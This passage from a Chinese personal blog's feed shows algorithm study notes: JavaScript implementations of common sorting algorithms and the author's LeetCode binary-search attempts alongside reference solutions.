    <content type="html"><![CDATA[<h1 id="HELLO-WORLD！"><a href="#HELLO-WORLD！" class="headerlink" title="HELLO WORLD！"></a>HELLO WORLD！</h1><h1 id="个人博客搭建记录"><a href="#个人博客搭建记录" class="headerlink" title="个人博客搭建记录"></a>个人博客搭建记录</h1><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HELLO-WORLD！&quot;&gt;&lt;a href=&quot;#HELLO-WORLD！&quot; class=&quot;headerlink&quot; title=&quot;HELLO WORLD！&quot;&gt;&lt;/a&gt;HELLO WORLD！&lt;/h1&gt;&lt;h1 id=&quot;个人博客搭建记录&quot;&gt;&lt;a href=&quot;#个人博客搭</summary>
      
    
    
    
    <category term="Hexo" scheme="https://asura1211.github.io/categories/Hexo/"/>
    
    
    <category term="记录" scheme="https://asura1211.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>【基本功】— — 算法</title>
    <link href="https://asura1211.github.io/2021/05/30/%E3%80%90%E5%9F%BA%E6%9C%AC%E5%8A%9F%E3%80%91%E2%80%94%20%E2%80%94%20%E7%AE%97%E6%B3%95/"/>
    <id>https://asura1211.github.io/2021/05/30/%E3%80%90%E5%9F%BA%E6%9C%AC%E5%8A%9F%E3%80%91%E2%80%94%20%E2%80%94%20%E7%AE%97%E6%B3%95/</id>
    <published>2021-05-30T08:58:31.000Z</published>
    <updated>2021-12-07T14:09:13.585Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/10/14/twAFeGEk9KUnRih.png" alt="算法脑图副本.png"></p><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>具体见<a href="https://www.cnblogs.com/onepixel/p/7674659.html">十大经典排序算法（动图演示）</a></p><p><img src="https://i.loli.net/2021/09/06/sucGyXieoSvHBrI.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/06/wZMKBa1Jol7CDbr.png" alt="image.png"></p><h2 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h2><p><strong>稳定性定义：</strong></p><p>排序前后两个相等的数相对位置不变，则算法稳定。</p><p>常见的<strong>稳定排序算法</strong>有：</p><ul><li>冒泡排序（Bubble Sort） — O(n²)</li><li>插入排序（Insertion Sort）— O(n²)</li><li>归并排序（Merge Sort）— O(nlogn); 需要 O(n) 额外空间</li><li>计数排序 (Counting Sort) — O(n+k); 需要 O(n+k) 额外空间</li><li>桶排序（Bucket Sort）— O(n+k); 需要 O(k) 额外空间</li><li>基数排序（Radix sort）— O(n*k); 需要 O(n) 额外空间</li></ul><p>常见的<strong>不稳定排序算法</strong>有：</p><ul><li>选择排序（Selection Sort）— O(n²)</li><li>希尔排序（Shell Sort）— O(nlogn)</li><li>堆排序（Heapsort）— O(nlogn)</li><li>快速排序（Quicksort）— O(nlogn) </li></ul><h2 id="初级排序-——-O-n-2"><a href="#初级排序-——-O-n-2" class="headerlink" title="初级排序 —— O(n^2)"></a>初级排序 —— O(n^2)</h2><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>每次排序取一个最大或最小的数字放到前面的有序序列中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &lt; arr[minIndex]) &#123;    </span><br><span class="line">        minIndex = j;                </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>将左侧序列看成一个有序序列，每次将一个数字插入该有序序列。插入时，从有序序列最右侧开始比较，若比较的数较大，后移一位。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertSort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> target = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[target] &lt; array[j]) &#123;</span><br><span class="line">                [array[target], array[j]] = [array[j], array[target]];</span><br><span class="line">                target = j;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="built_in">Array</span>.prototype.insertionSort = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> len = <span class="built_in">this</span>.length;</span><br><span class="line">    <span class="keyword">let</span> target;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        target = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>[target] &lt; <span class="built_in">this</span>[j]) &#123;</span><br><span class="line">                [<span class="built_in">this</span>[target], <span class="built_in">this</span>[j]] = [<span class="built_in">this</span>[j], <span class="built_in">this</span>[target]];</span><br><span class="line">                target = j;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>循环数组，比较当前元素和下一个元素，如果当前元素比下一个元素大，向上冒泡。下一次循环继续上面的操作，不循环已经排序好的数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &gt; arr[j+<span class="number">1</span>]) &#123;      </span><br><span class="line">        [arr[j], arr[j + <span class="number">1</span>]] = [arr[j + <span class="number">1</span>], arr[j]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高级排序-——-O-N-LogN"><a href="#高级排序-——-O-N-LogN" class="headerlink" title="高级排序 —— O(N*LogN)"></a>高级排序 —— O(N*LogN)</h2><h3 id="快速排序（★★★）"><a href="#快速排序（★★★）" class="headerlink" title="快速排序（★★★）"></a>快速排序（★★★）</h3><p>选择一个目标值，比目标值小的放左边，比目标值大的放右边；目标值的位置已排好，将左右两侧再进行快排。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> quickSort = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> mid = arr[arr.length &gt;&gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> left = [];</span><br><span class="line">    <span class="keyword">var</span> right = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; mid) &#123;</span><br><span class="line">            left.push(arr[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[i] &gt; mid) &#123;</span><br><span class="line">            right.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> quickSort(left).concat(mid, quickSort(right));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>将大序列二分成小序列，将小序列（归并）排序后，再将排序后的小序列归并成大序列。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(array.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">const</span> front = array.slice(<span class="number">0</span>, mid);</span><br><span class="line">    <span class="keyword">const</span> end = array.slice(mid);</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(front), mergeSort(end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">front, end</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> temp = [];</span><br><span class="line">    <span class="keyword">while</span> (front.length &amp;&amp; end.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (front[<span class="number">0</span>] &lt; end[<span class="number">0</span>]) &#123;</span><br><span class="line">            temp.push(front.shift());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            temp.push(end.shift());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (front.length) &#123;</span><br><span class="line">        temp.push(front.shift());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (end.length) &#123;</span><br><span class="line">        temp.push(end.shift());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.mergeSort = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">front, end</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result = [];</span><br><span class="line">        <span class="keyword">while</span> (front.length &amp;&amp; end.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (front[<span class="number">0</span>] &lt;= end[<span class="number">0</span>]) &#123;</span><br><span class="line">                result.push(front.shift());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.push(end.shift());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (front.length) result.push(front.shift());</span><br><span class="line">        <span class="keyword">while</span> (end.length) result.push(end.shift());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> (<span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> len = arr.length;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">return</span> arr;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">let</span> front = arr.slice(<span class="number">0</span>, mid);</span><br><span class="line">        <span class="keyword">let</span> end = arr.slice(mid);</span><br><span class="line">        <span class="keyword">return</span> merge(<span class="built_in">arguments</span>.callee(front), <span class="built_in">arguments</span>.callee(end));</span><br><span class="line">    &#125;)(<span class="built_in">this</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>归并和快排具有相似性，但步骤顺序相反：</strong></p><p>归并：先排序左右子数组，然后合并两个有序子数组</p><p>快排：先调配出左右子数组，然后对于左右子数组进行排序</p><ol><li><p>堆排序：创建一个大顶堆，大顶堆的堆顶一定是最大的元素。交换第一个元素和最后一个元素，让剩余的元素继续调整为大顶堆。从后往前以此和第一个元素交换并重新构建，排序完成。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    creatHeap(array);</span><br><span class="line">    <span class="comment">// 交换第一个和最后一个元素，然后重新调整大顶堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = array.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        [array[i], array[<span class="number">0</span>]] = [array[<span class="number">0</span>], array[i]];</span><br><span class="line">        adjust(array, <span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 构建大顶堆，从第一个非叶子节点开始，进行下沉操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creatHeap</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> len = array.length;</span><br><span class="line">    <span class="keyword">const</span> start = <span class="built_in">parseInt</span>(len / <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        adjust(array, i, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将第target个元素进行下沉，孩子节点有比他大的就下沉</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">adjust</span>(<span class="params">array, target, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span> * target + <span class="number">1</span>; i &lt; len; i = <span class="number">2</span> * i + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 找到孩子节点中最大的</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; len &amp;&amp; array[i + <span class="number">1</span>] &gt; array[i]) &#123;</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 下沉</span></span><br><span class="line">        <span class="keyword">if</span> (array[i] &gt; array[target]) &#123;</span><br><span class="line">            [array[i], array[target]] = [array[target], array[i]];</span><br><span class="line">            target = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="特殊排序-——-O-n"><a href="#特殊排序-——-O-n" class="headerlink" title="特殊排序 —— O(n)"></a>特殊排序 —— O(n)</h2><ol><li>计数排序(Counting Sort)：计数排序要求输入的数据必须是有确定范围的整数。将输入的数据值转化为键存<br>储在额外开辟的数组空间中；然后依次把计数大于1的填充回原数组。</li><li>桶排序(Bucket Sort)：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序(有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排)。</li><li>基数排序(Radix Sort)：基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。</li></ol><h2 id="LeetCode1122——数组的相对排序（☆）"><a href="#LeetCode1122——数组的相对排序（☆）" class="headerlink" title="LeetCode1122——数组的相对排序（☆）"></a>LeetCode1122——数组的相对排序（☆）</h2><p><a href="https://leetcode-cn.com/problems/relative-sort-array/">跳转地址</a></p><h3 id="自己的代码"><a href="#自己的代码" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>感觉这道题难度不止 easy ，一开始是想先对 arr1 排序，然后遍历 arr2 ，如果 arr1 没有就 shift 再 push。但是很麻烦。</p><h3 id="思路-amp-题解"><a href="#思路-amp-题解" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> relativeSortArray = <span class="function"><span class="keyword">function</span> (<span class="params">arr1, arr2</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//sort(a,b) 正常a,b中谁小排到前面</span></span><br><span class="line">  <span class="keyword">return</span> arr1.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a1 = arr2.indexOf(a);</span><br><span class="line">    <span class="keyword">let</span> b1 = arr2.indexOf(b);</span><br><span class="line">    <span class="keyword">if</span>(a1 == -<span class="number">1</span> &amp;&amp; b1 == -<span class="number">1</span>)&#123;<span class="comment">//如果a和b都不在arr2中，正常的大小升序</span></span><br><span class="line">      <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == -<span class="number">1</span>)&#123; <span class="comment">//如果a不在arr2中，a-b=1说明a&gt;b，a就得排在后面</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b1 == -<span class="number">1</span>)&#123; <span class="comment">//如果b不在arr2中，a-b=-1说明b&gt;a，b就得排在后面</span></span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">//如果都在arr2中，就看他们谁先出现在arr2中。如果a在前面，那么a1就小于b1，return -1</span></span><br><span class="line">      <span class="keyword">return</span> a1 - b1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p><strong>二分查找的前提：</strong></p><ul><li>目标函数单调性( 单调递增或者递减)</li><li>存在上下界</li><li>能够通过索引访问</li></ul><h2 id="LeetCode704——二分查找（☆）（★★）"><a href="#LeetCode704——二分查找（☆）（★★）" class="headerlink" title="LeetCode704——二分查找（☆）（★★）"></a>LeetCode704——二分查找（☆）（★★）</h2><p><a href="https://leetcode-cn.com/problems/binary-search/">跳转地址</a></p><h3 id="自己的代码-1"><a href="#自己的代码-1" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span> (<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor(nums.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (nums[mid] === target) &#123;</span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">        search(nums.slice(<span class="number">0</span>, mid), target);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        search(nums.slice(mid), target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC。美团二面这么简单的一套题= =!</p><h3 id="思路-amp-题解-1"><a href="#思路-amp-题解-1" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span> (<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums === <span class="literal">null</span> || !nums.length) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>,</span><br><span class="line">        right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] === target) <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode69——x-的平方根（☆）"><a href="#LeetCode69——x-的平方根（☆）" class="headerlink" title="LeetCode69——x 的平方根（☆）"></a>LeetCode69——x 的平方根（☆）</h2><p><a href="https://leetcode-cn.com/problems/sqrtx/">跳转地址</a></p><h3 id="自己的代码-2"><a href="#自己的代码-2" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; x; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i * i &gt;= x) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i * i &gt; x)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，但没有想到二分，这是O（n）的复杂度。</p><h3 id="思路1-amp-题解"><a href="#思路1-amp-题解" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>二分：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === <span class="number">0</span> || x === <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">1</span>, right = x;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = left + <span class="built_in">parseInt</span>((right - left) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (mid * mid &gt; x) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解"><a href="#思路2-amp-题解" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>牛顿迭代法（算了算了）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mySqrt = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    r = x;</span><br><span class="line">    <span class="keyword">while</span> (r * r &gt; x) &#123;</span><br><span class="line">        r = ((r + x / r) / <span class="number">2</span>) | <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode153——寻找旋转排序数组中的最小值（☆☆）"><a href="#LeetCode153——寻找旋转排序数组中的最小值（☆☆）" class="headerlink" title="LeetCode153——寻找旋转排序数组中的最小值（☆☆）"></a>LeetCode153——寻找旋转排序数组中的最小值（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">跳转地址</a></p><h3 id="自己的代码-3"><a href="#自己的代码-3" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[nums.length - <span class="number">1</span>] &lt; nums[<span class="number">0</span>]) &#123;</span><br><span class="line">      nums.unshift(nums[nums.length - <span class="number">1</span>]);</span><br><span class="line">      nums.pop(nums[nums.length - <span class="number">1</span>])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看了题解后发现这就是传说中的“暴破”法，时间复杂度为O（n）</p><h3 id="思路-amp-题解-2"><a href="#思路-amp-题解-2" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>二分法：首先，创建两个指针 left, right 分别指向 numbers 首尾数字，然后计算出两指针之间的中间索引值 middle，然后我们会遇到以下三种情况：</p><ol><li>middle &gt; right ：代表最小值一定在 middle 右侧，所以 left 移到 middle+1 的位置。</li><li>middle&lt; right：代表最小值一定在 middle 左侧或者就是 middle，所以 right 移到 middle 的位置。</li><li>middle 既不大于 left 指针的值，也不小于 right 指针的值，代表着 middle 可能等于 left 指针的值，或者 right 指针的值，这时候只能让 right 指针递减，来一个一个找最小值了。</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="comment">// 写成这样更好：left + ((right - left) &gt;&gt; 1)</span></span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &gt; nums[right]) left = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> right = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[left];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴破【不推荐】</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMin</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] &lt; nums[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：时间复杂度为 O(logn)。在二分查找的过程中，每一步会忽略一半的区间，因此时间复杂度为 O(logn)。</p><h2 id="LeetCode33——搜索旋转排序数组（☆☆）（to-redo）"><a href="#LeetCode33——搜索旋转排序数组（☆☆）（to-redo）" class="headerlink" title="LeetCode33——搜索旋转排序数组（☆☆）（to redo）"></a>LeetCode33——搜索旋转排序数组（☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">跳转地址</a></p><h3 id="自己的代码-4"><a href="#自己的代码-4" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 左边升序</span></span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= nums[mid] &amp;&amp; (target &gt; nums[mid] || target &lt; nums[<span class="number">0</span>])) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> 